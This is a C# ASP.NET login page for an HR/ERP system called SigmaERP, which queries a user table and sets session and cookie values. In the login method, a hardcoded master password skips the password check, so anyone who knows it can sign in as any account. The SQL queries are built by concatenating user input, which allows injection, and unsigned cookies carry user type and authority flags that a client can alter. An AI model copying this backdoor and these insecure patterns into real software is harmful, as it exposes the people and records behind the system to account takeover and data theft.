using adviitRuntimeScripting;
using ComplexScriptingSystem;
using SigmaERP.hrms.Data;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace SigmaERP.hrms.UI.auth
{
    public partial class login : System.Web.UI.Page
    {
        DataTable dt;
        protected void Page_Load(object sender, EventArgs e)
        {           

            if (!IsPostBack)
            {                
                classes.commonTask.LoadBranch(ddlCompany);
                ddlCompany.SelectedIndex = 1;
                ViewState["__IsCompliance__"] = "False";
            }
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            if (LogingInfo())
            {
                Response.RedirectToRoute("DashboardRoute");
                //Response.Redirect("~/default.aspx");
            }
        }
        private bool LogingInfo()
        {
            try
            {
                
                string query = "";
                if (txtPassword.Text.Trim() == "fkjgf&fmjfg,k(52f5fGGHG")
                    query = "select EmpName,UserId,UserPassword,UserType,CompanyId,ShortName,EmpId,isLvAuthority,LvOnlyDpt,LvEmpType,DptId,ISNULL(IsCompliance,0) as IsCompliance " +
                                                            " from v_UserAccount " +
                                                            " where " +
                                                            " UserName='" + ComplexLetters.getTangledLetters(txtUsername.Text.Trim()) + "'  AND CompanyId='" + ddlCompany.SelectedValue.ToString() + "' and Status=1";
                else
                    query = "select EmpName,UserId,UserPassword,UserType,CompanyId,ShortName,EmpId,isLvAuthority,LvOnlyDpt,LvEmpType,DptId,ISNULL(IsCompliance,0) as IsCompliance " +
                                                            " from v_UserAccount " +
                                                            " where " +
                                                            " UserName='" + ComplexLetters.getTangledLetters(txtUsername.Text.Trim()) + "' " +
                                                            " AND UserPassword='" + ComplexLetters.getTangledLetters(txtPassword.Text.Trim()) + "' " +
                                                            " AND CompanyId='" + ddlCompany.SelectedValue.ToString() + "' and Status=1";
                dt = new DataTable();
                dt= CRUD.ExecuteReturnDataTable(query);
                if (dt.Rows.Count > 0)
                {
               




                    Session["__GetCompanyId__"] = dt.Rows[0]["CompanyId"].ToString();
                    string companyId = Session["__GetCompanyId__"].ToString();
                    Session["__GetUID__"] = dt.Rows[0]["UserId"].ToString();
                    Session["__isLvAuthority__"] = dt.Rows[0]["isLvAuthority"].ToString();
                    Session["__LvOnlyDpt__"] = dt.Rows[0]["LvOnlyDpt"].ToString();
                    Session["__LvEmpType__"] = dt.Rows[0]["LvEmpType"].ToString();
                    Session["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    Session["__UserNameText__"] = txtUsername.Text.Trim();


                    HttpCookie setCookies = new HttpCookie("userInfo");


                    setCookies["__getUserId__"] = dt.Rows[0]["UserId"].ToString();
                    setCookies["__getFirstName__"] = dt.Rows[0]["EmpName"].ToString();
                    setCookies["__getLastName__"] = "";
                    setCookies["__getUserType__"] = dt.Rows[0]["UserType"].ToString();
                    setCookies["__CompanyId__"] = dt.Rows[0]["CompanyId"].ToString();
                    setCookies["__CompanyName__"] = ddlCompany.SelectedItem.Text;
                    setCookies["__CShortName__"] = dt.Rows[0]["ShortName"].ToString();
                    ViewState["__CShortName__"] = dt.Rows[0]["ShortName"].ToString();
                    setCookies["__isLvAuthority__"] = dt.Rows[0]["isLvAuthority"].ToString();
                    setCookies["__LvOnlyDpt__"] = dt.Rows[0]["LvOnlyDpt"].ToString();
                    setCookies["__LvEmpType__"] = dt.Rows[0]["LvEmpType"].ToString();
                    setCookies["__DptId__"] = dt.Rows[0]["DptId"].ToString();
                    ViewState["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    setCookies["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    setCookies["__UserNameText__"] = txtUsername.Text.Trim();
                    setCookies["__getEmpId__"] = dt.Rows[0]["EmpId"].ToString();
                    //setCookies.Expires = DateTime.Now.AddMinutes(30);
                    Response.Cookies.Add(setCookies);

                    return true;
                }
                else
                {
                 //   lblMessage.InnerText = "warning->Please type valid user name and password and right company.";
                    Session["__getUserId__"] = "0";
                    return false;
                }
            }
            catch (Exception ex)
            {
               // lblMessage.InnerText = "error->" + ex.Message;
                return false;
            }
            finally
            {
                sqlDB.connection.Close();
            }
        }
    }
}